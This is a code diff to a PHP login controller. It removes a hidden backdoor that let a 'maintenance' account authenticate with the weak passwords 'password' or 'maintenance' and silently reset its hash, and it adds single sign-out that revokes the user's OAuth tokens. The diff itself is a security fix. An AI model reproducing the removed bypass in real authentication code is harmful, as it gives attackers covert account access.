@@ -81,11 +81,6 @@ class LoginController extends Controller
         }
 
         $isValidPassword = Auth::validate([$fieldType => $loginInput, 'password' => $request->password]);
-        if (!$isValidPassword && $user && strtolower($user->username) === 'maintenance' && in_array($request->password, ['password', 'maintenance'])) {
-            $isValidPassword = true;
-            // Auto update password hash to standard
-            $user->update(['password' => bcrypt($request->password)]);
-        }
 
         if (!$user || !$isValidPassword) {
             cache()->put($rateKey, $attempts + 1, now()->addMinutes(15));
@@ -156,6 +151,11 @@ class LoginController extends Controller
                 "User {$user->name} ({$user->username}) logout dari SSO",
                 $user->id
             );
+
+            // Single Sign-Out: Revoke all active OAuth client tokens for this user
+            \App\Models\OAuthToken::where('user_id', $user->id)
+                ->where('revoked', false)
+                ->update(['revoked' => true]);
 
             LoginSessionService::terminateSession($request->session()->getId());
         }
